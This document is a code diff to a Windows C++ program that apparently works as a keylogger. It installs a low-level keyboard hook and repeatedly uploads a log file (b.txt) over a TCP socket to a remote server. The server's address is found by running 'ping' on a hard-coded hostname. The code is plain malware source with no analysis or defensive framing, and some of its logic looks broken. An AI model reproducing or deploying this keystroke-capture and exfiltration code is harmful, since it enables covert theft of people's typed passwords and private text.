@@ -13,8 +13,31 @@ using namespace std;
 
 bool shift = false;
 
-const string SERVER_IP = "10.228.162.138";
+SOCKET socket_fd;
+
+string SERVER_IP = "10.228.162.138";
 const int SERVER_PORT = 1235; 
+
+string findIp(string hostname) {
+    FILE *o = popen(("ping -a " + hostname).c_str(), "r");
+    // Sleep(10000);
+    string ip = "";
+    // format: >Pinging I-ACL-PF3TWBVD [10.228.161.97] with 32 bytes of data:
+    char buf[100];
+    fgets(buf, 100, o);
+    if(buf[0] == 'P'){
+        return "potato";
+    }
+    fgets(buf, 100, o);
+    cout << buf;
+    for (int a = 10 + hostname.size(); a < 100; a++) {
+        if (buf[a] == ']')
+            break;
+        ip += buf[a];
+    }
+    pclose(o);
+    return ip;
+}
 
 void sendfile(SOCKET s, const char fname[]){
     HANDLE hFile = CreateFileA(fname, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -65,16 +88,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 void run(){
-    // Install the low-level keyboard & mouse hooks
-    HHOOK Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
-    // Keep this app running until we're told to stop
-    MSG msg;
-    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
-
-    UnhookWindowsHookEx(Kybd);
+    
 }
 
 void send(SOCKET sock){
@@ -85,16 +99,18 @@ void send(SOCKET sock){
 }
 
 void sender(){
+    if ((SERVER_IP = findIp("I-AET-PF4HB1GR")) == "potato") return;
+
     WSADATA wsaData;
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
         cout << "could not initialize winsock" << endl;
     }
 
     // Create socket
-    SOCKET socket_fd = socket(AF_INET, SOCK_STREAM, 0);
+    socket_fd = socket(AF_INET, SOCK_STREAM, 0);
     if (socket_fd == INVALID_SOCKET) {
         cout << "could not make socket" << endl;
-        WSACleanup();
+        // WSACleanup();
     }
 
     // Set up server address
@@ -103,36 +119,44 @@ void sender(){
     serverAddr.sin_port = htons(SERVER_PORT);
     if (inet_pton(AF_INET, SERVER_IP.c_str(), &(serverAddr.sin_addr)) <= 0) {
         cout << "invalid IP." << endl;
-        closesocket(socket_fd);
-        WSACleanup();
+        // closesocket(socket_fd);
+        // WSACleanup();
     }
 
-    // Connect to server
     if (connect(socket_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
         cout << "could not connect to server" << endl;
-        closesocket(socket_fd);
-        WSACleanup();
+        // closesocket(socket_fd);
+        // WSACleanup();
     }
 
-    while (true){
-        try{
-            send(socket_fd);
-        } catch(exception e){}
-        this_thread::sleep_until(chrono::system_clock::now()+chrono::minutes(2));
-    }
+    send(socket_fd);
+    sendfile(socket_fd, "b.txt");
 
+
+
+    
+}
+
+int main(){
+    
+    auto t = chrono::system_clock::now();
+    // Connect to server
+    // Install the low-level keyboard & mouse hooks
+    HHOOK Kybd = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 0, 0);
+    // Keep this app running until we're told to stop
+    MSG msg;
+    while (!GetMessage(&msg, NULL, NULL, NULL)) {    //this while loop keeps the hook
+        if ((chrono::system_clock::now()-t).count() >= 5){
+            sender();
+        }
+        t = chrono::system_clock::now();
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
 
     closesocket(socket_fd);
     WSACleanup();
-}
 
-int main()
-{
-    thread t = thread(run);
-    thread s = thread(sender);
-    
-    t.join();
-    s.join();
+    UnhookWindowsHookEx(Kybd);
     return 0;
-
 }
